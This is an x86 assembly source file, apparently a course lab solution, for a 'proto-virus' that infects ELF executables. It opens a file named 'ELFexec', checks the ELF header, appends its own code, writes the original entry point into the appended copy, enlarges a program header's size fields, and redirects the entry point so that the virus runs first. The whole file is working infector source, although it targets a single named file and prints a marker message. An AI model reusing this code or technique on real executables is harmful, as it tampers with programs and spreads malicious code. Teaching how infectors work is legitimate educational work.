%macro syscall 2
    mov ebx, %2
    mov eax, %1
    int 0x80
%endmacro
%macro syscall 4
    mov edx, %4
    mov ecx, %3
    mov ebx, %2
    mov eax, %1
    int 0x80
%endmacro

%macro exit 1
    syscall 1, %1
%endmacro
%macro write 3
    syscall 4, %1, %2, %3
%endmacro
%macro read 3
    syscall 3, %1, %2, %3
%endmacro
%macro open 3
    syscall 5, %1, %2, %3
%endmacro
%macro lseek 3
    syscall 19, %1, %2, %3
%endmacro
%macro close 1
    syscall 6, %1
%endmacro

%define anchor_loc_ret eax
%macro get_lbl_loc 1
    call get_anchor_loc
    add anchor_loc_ret, (%1-anchor)
%endmacro
%macro get_lbl_loc 2
    get_lbl_loc %2
    mov %1, anchor_loc_ret
%endmacro

%macro seek_to_start 1
    lseek %1, 0, SEEK_SET
%endmacro
%macro seek_to_end 1
    lseek %1, 0, SEEK_END
%endmacro

%macro lea_stack_var 2-3 eax
    lea %3, %2
    mov %1, %3
%endmacro

%define RDWR 2
%define SEEK_END 2
%define SEEK_SET 0

%define ELF_HEADER_SIZE 52
%define EHDR_entry 24
%define EHDR_phoff 28
%define EHDR_phnum 44

%define PHDR_SIZE 32
%define PHDR_offset   4
%define PHDR_vaddr    8
%define PHDR_filesize 16
%define PHDR_memsize  20

%define stdout 1
%define STK_RES 200
CODE_SIZE EQU (virus_end - virus_start)
CODE_START_OFFSET EQU (_start - virus_start)

global _start

section .text
virus_start:
nop

get_anchor_loc:
    call anchor
anchor:
    pop anchor_loc_ret
    ret

_start:
    %push
    push ebp
    mov ebp, esp
    sub esp, STK_RES ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
    %xdefine %$base 0
    %xdefine %$loc ebp-4
    %xdefine %$p_stack_var ebp-8
    %xdefine %$fd ebp-12
    %xdefine %$fsz ebp-16

    ; task 0b
    %xdefine %$base 16
    %xdefine %$mag ebp-(%$base+4)

    ; task 1b
    %xdefine %$base 20
    %xdefine %$elf_header ebp-(%$base+ELF_HEADER_SIZE)

    ; task 2
    %xdefine %$base 20+ELF_HEADER_SIZE
    %xdefine %$exe_original_entry_point_vaddr ebp-(%$base+4)

    ; task 3
    %xdefine %$base 24+ELF_HEADER_SIZE
    %xdefine %$virus_base_vaddr ebp-(%$base+4)
    %xdefine %$ph_table_off ebp-(%$base+8)
    %xdefine %$ph_num ebp-(%$base+12)
    %xdefine %$ph_off ebp-(%$base+16)
    %xdefine %$ph ebp-(%$base+16+PHDR_SIZE)

    .print_msg:
    get_lbl_loc [%$loc], OutStr
    write stdout, [%$loc], OutStr_len

    .open_elf_file:
    get_lbl_loc [%$loc], FileName
    open [%$loc], RDWR, 0
    
    .check_open:
    cmp eax, 0
    jg .open_success

    .open_failed:
    mov dword [ebp-8], eax
    get_lbl_loc [%$loc], Failstr
    write stdout, [%$loc], Failstr_len
    exit 1

    .open_success:
    mov dword [%$fd], eax

    .read_elf_magic_number:
    lea_stack_var [%$p_stack_var], [%$mag]
    read [%$fd], [%$p_stack_var], 4

    .check_elf_magic_number:
    cmp byte [%$mag], 0x7f
    jne .invalid_elf_magic_number
    cmp byte [%$mag+1], 'E'
    jne .invalid_elf_magic_number
    cmp byte [%$mag+2], 'L'
    jne .invalid_elf_magic_number
    cmp byte [%$mag+3], 'F'
    jne .invalid_elf_magic_number
    .valid_elf_magic_number:
    jmp .end_check_elf_magic_number
    .invalid_elf_magic_number:
    get_lbl_loc [%$loc], Failstr
    write stdout, [%$loc], Failstr_len
    exit 2
    .end_check_elf_magic_number:
    nop

    .append_virus_code:
    seek_to_end [%$fd]
    mov [%$fsz], eax
    get_lbl_loc [%$loc], virus_start
    write [%$fd], [%$loc], CODE_SIZE

    .read_elf_header:
    seek_to_start [%$fd]
    lea_stack_var [%$p_stack_var], [%$elf_header]
    read [%$fd], [%$p_stack_var], ELF_HEADER_SIZE

    .save_original_entry_point:
    mov eax, dword [%$elf_header+EHDR_entry]
    mov dword [%$exe_original_entry_point_vaddr], eax

    .write_original_entry_point:
    lseek [%$fd], -4, SEEK_END
    lea_stack_var [%$p_stack_var], [%$exe_original_entry_point_vaddr]
    write [%$fd], [%$p_stack_var], 4
    
    .read_elf_header_program_headers_info:
    mov eax, dword [%$elf_header+EHDR_phoff]
    mov dword [%$ph_table_off], eax
    mov eax, [%$elf_header+EHDR_phnum]
    mov dword [%$ph_num], eax

    .calc_ph_off:
    mov eax, dword [%$ph_table_off]
    add eax, PHDR_SIZE
    mov dword [%$ph_off], eax

    .read_program_header:
    lseek [%$fd], [%$ph_off], SEEK_SET
    lea_stack_var [%$p_stack_var], [%$ph]
    read [%$fd], [%$p_stack_var], PHDR_SIZE

    .set_program_header_sizes:
    mov eax, 0
    sub eax, dword [%$ph+PHDR_offset]
    add eax, dword [%$fsz]
    add eax, dword CODE_SIZE
    mov dword [%$ph+PHDR_filesize], eax
    mov dword [%$ph+PHDR_memsize], eax

    .write_program_header_back_to_file:
    lseek [%$fd], [%$ph_off], SEEK_SET
    lea_stack_var [%$p_stack_var], [%$ph]
    write [%$fd], [%$p_stack_var], PHDR_SIZE

    .calc_virus_base_vaddr:
    mov eax, 0
    sub eax, dword [%$ph+PHDR_offset]
    add eax, dword [%$ph+PHDR_vaddr]
    mov dword [%$virus_base_vaddr], eax

    .set_new_entry_point:
    mov eax, 0
    add eax, dword [%$virus_base_vaddr]
    add eax, [%$fsz]
    add eax, CODE_START_OFFSET
    mov dword [%$elf_header+EHDR_entry], eax

    .write_elf_header_back_to_file:
    seek_to_start [%$fd]
    lea_stack_var [%$p_stack_var], [%$elf_header]
    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE

    .close_file:
    close [%$fd]

    .jump_to_original_entry_point:
    get_lbl_loc PreviousEntryPoint
    jmp [anchor_loc_ret]

VirusExit:
       exit 0 ; Termination if all is OK and no previous code to jump to
              ; (also an example for use of above macros)
    
FileName: db "ELFexec", 0

OutStr: db "The lab 9 proto-virus strikes!", 10, 0
OutStr_len EQU $ - OutStr - 1

Failstr: db "perhaps not", 10 , 0
Failstr_len EQU $ - Failstr - 1

PreviousEntryPoint: dd VirusExit
virus_end:

%pop
